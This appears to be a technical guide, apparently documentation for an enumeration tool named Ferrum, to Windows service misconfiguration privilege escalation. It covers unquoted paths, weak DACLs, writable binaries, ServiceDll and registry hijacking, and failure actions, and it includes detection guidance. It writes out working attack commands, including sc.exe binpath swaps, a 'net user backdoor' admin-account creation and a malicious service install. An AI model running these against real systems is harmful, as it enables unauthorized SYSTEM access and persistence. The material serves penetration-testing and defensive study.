# Service Misconfiguration LPE — Deep Dive

Windows Service architecture internals, SCM, DACL model, and all misconfiguration-based
privilege escalation vectors: unquoted paths, weak ACLs, writable binaries, registry key
permissions, and DLL hijacking via services.

---

## 1. Windows Service Architecture

### What is a Service?

A Windows service is a long-running process managed by the Service Control Manager (SCM).
Services can start before any user logs in, run in background, and use any Windows account
as their security context — including LocalSystem, LocalService, NetworkService, or a custom
domain/local account.

Services are defined in the registry:
```
HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>\
    Type         = 0x10 (own process) | 0x20 (shared process / svchost)
    Start        = 0x00 (Boot) | 0x01 (System) | 0x02 (Auto) | 0x03 (Manual) | 0x04 (Disabled)
    ErrorControl = 0x00 (Ignore) | 0x01 (Normal) | 0x02 (Severe) | 0x03 (Critical)
    ImagePath    = "C:\Program Files\MyService\svc.exe" OR "svchost.exe -k netsvcs"
    ObjectName   = "LocalSystem" | "NT AUTHORITY\LocalService" | ".\username"
    DisplayName  = "Human Readable Name"
    Description  = "..."
    
    Parameters\  (optional subkey for service-specific config)
    Security\    (optional; stores service DACL if non-default)
```

### Service Control Manager (SCM)

SCM (`services.exe`) is the Windows service manager. It:
- Reads service database from registry on boot
- Starts/stops services based on dependency order and Start type
- Enforces security — checks caller's permission before allowing service operations
- Communicates with services via a named pipe (`\\.\pipe\svcctl`)

SCM's own security descriptor controls who can do what:
```
SC_MANAGER_CONNECT             → connect to SCM
SC_MANAGER_CREATE_SERVICE      → create new service
SC_MANAGER_ENUMERATE_SERVICE   → list services
SC_MANAGER_LOCK                → lock service database
SC_MANAGER_QUERY_LOCK_STATUS   → query lock
SC_MANAGER_MODIFY_BOOT_CONFIG  → modify boot config
```

### Per-Service Security Descriptor

Each service has a DACL controlling access:
```
SERVICE_QUERY_CONFIG        → read service configuration
SERVICE_CHANGE_CONFIG       → modify service configuration ← LPE key permission
SERVICE_QUERY_STATUS        → read service status
SERVICE_ENUMERATE_DEPENDENTS→ list dependent services
SERVICE_START               → start service
SERVICE_STOP                → stop service
SERVICE_PAUSE_CONTINUE      → pause/resume
SERVICE_INTERROGATE         → query status
SERVICE_USER_DEFINED_CONTROL→ send custom control codes
SERVICE_ALL_ACCESS          → all of the above
```

**Attack focus**: `SERVICE_CHANGE_CONFIG` — allows modifying the `ImagePath` (binary path).
If a non-admin user has this permission on a SYSTEM-run service, they can change the binary
path to their payload and restart the service → SYSTEM execution.

---

## 2. Technique 1: Unquoted Service Path

### The Vulnerability

Windows parses `ImagePath` values in the services registry without always requiring quotes
around paths with spaces. When SCM launches a service binary, it passes the ImagePath to
`CreateProcess`. `CreateProcess` has ambiguous parsing for unquoted paths with spaces.

**CreateProcess path parsing algorithm** (when no quotes):
Windows tries each successive word as a potential executable path:

```
ImagePath = C:\Program Files\My Service\service.exe --args

Attempt 1: CreateProcess("C:\Program")           → fails (no such file)
Attempt 2: CreateProcess("C:\Program Files\My")  → fails
Attempt 3: CreateProcess("C:\Program Files\My Service\service.exe") → succeeds
```

**Attack**:
If the attacker can create files at any of the prefix paths:
```
C:\Program.exe               → would be executed if writable at C:\
C:\Program Files\My.exe      → executed if C:\Program Files\ is writable at root level
C:\Program Files\My Service.exe → not needed (exact path found at step 3 anyway)
```

### Why C:\ Root Write Is Rare But Still Happens

Default DACL on C:\ root:
```
BUILTIN\Administrators: Full Control
NT AUTHORITY\SYSTEM: Full Control
CREATOR OWNER: Full Control
BUILTIN\Users: Read & Execute, List Folder Contents
```
Standard users cannot write to C:\, so `C:\Program.exe` doesn't work on default installs.

However:
- Some software creates `C:\Program Files (x86)` or `C:\SomeCustomDir` with lax permissions
- IoT/industrial software often installs to `C:\App` with full-control for Everyone
- Custom services installed by non-security-aware developers

**Practical scenario**:
```
ImagePath = C:\CustomApps\My Software\service.exe
                         ^^writable^^

If C:\CustomApps\ or C:\CustomApps\My\ is user-writable:
Plant: C:\CustomApps\My.exe  → gets executed instead

More common:
ImagePath = C:\Program Files (x86)\CompanyName\Product Name\svc.exe
If "C:\Program Files (x86)\CompanyName\" is writable:
Plant: C:\Program Files (x86)\CompanyName\Product.exe → executed
```

### Enumeration

```powershell
# PowerShell: find all services with unquoted paths containing spaces
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notmatch '^"' -and $_.PathName -match ' '
} | Select-Object Name, PathName, StartMode, State

# Or using sc.exe:
sc.exe qc <servicename>  # check PathName field
```

```
accesschk.exe -uwcqv "Users" *     # services writable by Users group
accesschk.exe -uwcqv Everyone *    # services writable by Everyone
PowerSploit: Get-ServiceUnquoted   # automated check
WinPEAS: checks unquoted service paths automatically
```

### What Makes It Exploitable

For exploitability:
1. ImagePath must be unquoted
2. ImagePath must contain spaces
3. A parent directory component must be user-writable
4. Service must run as elevated account (SYSTEM, admin)
5. Attacker can restart the service (or wait for reboot)

**Service restart permission**:
- If attacker has `SERVICE_STOP` + `SERVICE_START`: can cycle the service directly
- If not: must wait for scheduled restart or reboot
- Some services configured as auto-start but not running → starting triggers the exploit

---

## 3. Technique 2: Weak Service DACL

### SERVICE_CHANGE_CONFIG LPE

If a non-privileged user has `SERVICE_CHANGE_CONFIG` on a service running as SYSTEM:

```
sc.exe config <service> binpath= "C:\Users\user\payload.exe"
sc.exe stop <service>
sc.exe start <service>
→ payload.exe runs as SYSTEM
```

Or more stealthily, change the binary path to add a backdoor user:
```
sc.exe config <service> binpath= "cmd.exe /c net user backdoor P@ssw0rd /add && net localgroup administrators backdoor /add"
sc.exe start <service>
sc.exe config <service> binpath= "C:\OriginalPath\service.exe"  # restore
```

### Checking Service DACLs

```
# sc.exe shows SDDL:
sc.exe sdshow <service>

# accesschk.exe — most readable:
accesschk.exe -ucwqv "Authenticated Users" <service>
accesschk.exe -uwcqv "Users" <service>

# Output to look for:
#   RW SERVICE_CHANGE_CONFIG   ← exploitable if service runs as SYSTEM
```

### SCM-Level Weak DACL

If the SCM itself has weak permissions (`SC_MANAGER_CREATE_SERVICE` for non-admins),
any user can create new services and run arbitrary code as SYSTEM immediately:
```
sc.exe create evilsvc binpath= "C:\evil.exe" type= own start= auto
sc.exe start evilsvc
```
This is unusual on modern defaults but can occur in heavily customized environments.

---

## 4. Technique 3: Writable Service Binary

If the executable pointed to by a service's `ImagePath` is writable by a non-privileged user:

```
icacls "C:\Program Files\SomeService\svc.exe"
# If: Everyone / Users / Authenticated Users has (W) or (M) or (F) → vulnerable

# Replace binary:
copy /y "C:\Users\user\payload.exe" "C:\Program Files\SomeService\svc.exe"
sc.exe stop SomeService
sc.exe start SomeService
# payload.exe runs as SYSTEM
```

**More surgical approach** (avoid killing the service completely — preserve function):
- Patch the binary in-place to add a new thread at the entry point that executes payload
- Or: replace with a wrapper that first executes payload, then executes original binary
  (rename original first)

### Why This Happens

- Software installed without proper ACL setup
- Vendors misguidedly grant broad permissions for "easy updates"
- Installers that set `Everyone: Full Control` on the install directory
- Software that self-updates by writing to its own binary (makes the binary user-writable
  after the first run with an elevated installer, leaving a writable file owned by SYSTEM
  but with user-write ACE added)

---

## 5. Technique 4: Service DLL Hijacking (svchost.exe Services)

### Shared Service Host Architecture

Many Windows services run inside a shared `svchost.exe` process:
```
svchost.exe -k netsvcs
  ├── Schedule (Task Scheduler)
  ├── BITS (Background Intelligent Transfer)
  ├── Themes
  └── ...
```
The actual service implementation is in a DLL, referenced via:
```
HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>\Parameters\
    ServiceDll = "C:\Windows\System32\actual_svc.dll"
```

**Attack**: If `ServiceDll` points to a user-writable DLL path, replace the DLL.
If the service's Parameters key itself is writable, change `ServiceDll` to attacker's DLL.

### ServiceDll Path Writable
```
# Check ServiceDll writability for a service running as SYSTEM:
$svc = "Schedule"
$dllPath = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Parameters").ServiceDll
icacls $dllPath
# If Users / Everyone has write → replace DLL → SYSTEM code execution when service restarts
```

### ServiceDll Registry Key Writable
```
accesschk.exe -kvusq "Users" HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters
# If writable → change ServiceDll value → point to evil DLL
```

---

## 6. Technique 5: Service Registry Key ACL

### Why Service Registry Keys Can Be Vulnerable

By default, service registry keys are protected:
```
HKLM\SYSTEM\CurrentControlSet\Services\<svc>
  DACL: Administrators: Full Control
        SYSTEM: Full Control
        Users: Read
```

However, some third-party software, drivers, or misconfigured enterprise deployments
set overly permissive ACLs on service keys.

### What Writable Keys Enable

**ImagePath writable (direct equivalent of CHANGE_CONFIG)**:
```
reg add "HKLM\SYSTEM\CurrentControlSet\Services\vulnsvc" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\user\evil.exe" /f
# Stop and start service → SYSTEM execution
```

**ObjectName writable** (less common):
Change the account a service runs under:
```
reg add "HKLM\SYSTEM\CurrentControlSet\Services\vulnsvc" /v ObjectName /t REG_SZ /d "LocalSystem" /f
# If service was running as limited account → now runs as SYSTEM
```

### Enumeration

```
accesschk.exe -kvusq "Users" HKLM\SYSTEM\CurrentControlSet\Services
# Shows all service registry keys with non-default user permissions

# PowerShell equivalent:
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" | ForEach-Object {
    $acl = Get-Acl $_.PSPath
    $writable = $acl.Access | Where-Object {
        $_.IdentityReference -match "Users|Everyone|Authenticated" -and
        $_.RegistryRights -match "SetValue|WriteKey|FullControl"
    }
    if ($writable) { Write-Host "Writable: $($_.Name)" }
}
```

---

## 7. Service Account Context and What You Get

### LocalSystem

`NT AUTHORITY\SYSTEM` — the most privileged account in Windows.
- Member of Administrators group
- Has all privileges enabled: SeDebugPrivilege, SeTcbPrivilege, SeAssignPrimaryTokenPrivilege, etc.
- Credentials: LSASS stores system secrets; LocalSystem can access them
- Can open any process
- On domain: accesses network as `COMPUTERNAME$`

### LocalService

`NT AUTHORITY\LOCAL SERVICE`
- Restricted compared to LocalSystem
- No Kerberos credentials for network
- Some privileges removed
- Still more privileged than a standard user
- Used for services that need limited system access

### NetworkService

`NT AUTHORITY\NETWORK SERVICE`
- Like LocalService but can authenticate on network as the computer account
- Lower privileges than LocalSystem
- IIS application pools often run as NetworkService

### Custom Domain/Local Accounts

Services configured with a specific user account get that user's full token.
If the account is a domain admin or local admin → high-value target.

---

## 8. Service Failure Recovery — The Often-Overlooked Vector

Windows services have configurable failure recovery actions:
```
HKLM\SYSTEM\CurrentControlSet\Services\<svc>\
    FailureActions = binary blob containing:
        - Reset period (seconds)
        - Action on failure 1: Restart | Run a Program | Reboot
        - Action on failure 2: ...
        - Action on failure 3: ...
    FailureCommand = "C:\some\command.exe"  ← if "Run a Program" action selected
```

**Attack**: If `FailureCommand` is writable or points to a writable binary → crash the
service → failure action executes FailureCommand as SYSTEM.

**How to crash a service**: Send malformed input if service has network interface, or
use `sc.exe failure` to set a controlled crash scenario, or simply terminate the process.

Checking via `sc.exe`:
```
sc.exe qfailure <service>
# Look for: COMMAND = C:\some\writable\path.exe
```

---

## 9. Ferrum's Service Enumeration Logic

Ferrum's `services` module applies these heuristics to each service:

**Non-system accounts running active services**:
Flag services where `ObjectName` is not LocalSystem, LocalService, or NetworkService but
the service is currently running. Custom accounts may have weak passwords or be reusable.

**Unquoted paths**:
`isUnquotedPathWithSpaces()` → check if `PathName` lacks leading quote AND contains space.
If yes → flag as unquoted path vulnerability.

**Writable binary locations**:
Check if the binary path contains `\Users\`, `\Temp\`, or `\ProgramData\`:
```go
if strings.Contains(lowerPath, `\users\`) ||
   strings.Contains(lowerPath, `\temp\`) ||
   strings.Contains(lowerPath, `\programdata\`) {
    reasons = append(reasons, "binary in user-writable location")
}
```

**Failed auto-start**:
Service configured for automatic start but currently stopped → potential misconfiguration
or crash scenario. Also useful as persistence target (attacker can start the service to
trigger payload if they've modified it).

---

## 10. Automated Enumeration Tools

### accesschk.exe (Sysinternals)
```
# Services writable by Users group:
accesschk.exe -uwcqv "Users" *

# Service binary file writable:
accesschk.exe -uwq "Users" "C:\Program Files\SomeService\svc.exe"

# Service registry key:
accesschk.exe -kvusq "Users" HKLM\SYSTEM\CurrentControlSet\Services
```

### PowerSploit / PowerUp
```powershell
Import-Module PowerUp.ps1
Invoke-AllChecks           # runs all service checks
Get-ServiceUnquoted        # unquoted paths
Get-ModifiableServiceFile  # writable service binaries
Get-ModifiableService      # weak DACLs (SERVICE_CHANGE_CONFIG)
Get-ModifiableRegistryAutoRun # registry autoruns
```

### WinPEAS
```
winpeas.exe servicesinfo   # service vulnerability checks
winpeas.exe all            # all checks including services
```

### Ferrum
```
ferrum.exe --services      # Ferrum service module
ferrum.exe --ALL --OUTPUT report.txt
```

### sc.exe (Built-in)
```
sc.exe qc <service>        # query service config
sc.exe sdshow <service>    # show service DACL in SDDL format
sc.exe qfailure <service>  # query failure actions
```

---

## 11. Detection

### Event ID 7045 — New Service Installed
```
Event: 7045, Source: Service Control Manager
Service Name: <name>
Service File Name: C:\Users\user\payload.exe  ← suspicious path
Service Type: User Mode Service
Service Start Type: Auto Start
Service Account: LocalSystem  ← if SYSTEM + suspicious path → alert
```

### Event ID 4697 — Service Installed (Security Log)
```
SubjectUserName: attacker_user
ServiceName: evilsvc
ServiceFileName: %%COMSPEC%% /c net user ...  ← command injection via binpath
ServiceType: 0x10
ServiceStartType: 3
ServiceAccount: LocalSystem
```

### Event ID 7036 / 7040 — Service State Change
If a service changes state unexpectedly (stops then starts) → may indicate binary swap.

### File System Audit
Audit write events on service binary paths. Alert on writes to:
- `C:\Windows\System32\*.dll` (if possible)
- `C:\Program Files\*\*.exe` and `*.dll` (service binaries)

### Registry Audit (Event 4657)
```
Alert: write to HKLM\SYSTEM\CurrentControlSet\Services\*\ImagePath
Alert: write to HKLM\SYSTEM\CurrentControlSet\Services\*\Parameters\ServiceDll
by non-SYSTEM / non-admin account
```

### Sysmon
```xml
<!-- Process creation from unusual service binary paths -->
<ProcessCreate>
  <ParentImage>services.exe</ParentImage>  
  <!-- if Image not in C:\Windows\ → alert -->
</ProcessCreate>
```

---

## 12. Service Misconfiguration Attack Chain Summary

```
Enumeration phase:
    accesschk + sc.exe sdshow + icacls on service binaries
    PowerUp: Invoke-AllChecks
    WinPEAS: servicesinfo
    Ferrum: --services
          │
          ▼
Find vulnerability:
    Unquoted path + writable parent dir?
        → Plant executable at intercepted path
        → Restart service → SYSTEM
    
    SERVICE_CHANGE_CONFIG for non-admin user?
        → sc.exe config <svc> binpath= "payload.exe"
        → sc.exe stop/start <svc> → SYSTEM
    
    Service binary writable?
        → Replace binary with payload (proxy original if needed)
        → Restart service → SYSTEM
    
    ServiceDll writable (svchost service)?
        → Replace DLL
        → Restart svchost/service → SYSTEM
    
    Service registry key writable?
        → Modify ImagePath directly in registry
        → Restart service → SYSTEM
    
    FailureCommand points to writable binary?
        → Replace binary
        → Crash service (or wait)
        → Failure action executes payload → SYSTEM
          │
          ▼
Execution:
    Service account = SYSTEM → immediate SYSTEM shell
    Service account = admin  → add backdoor admin user
    Service account = low    → limited gain, but may chain further
```
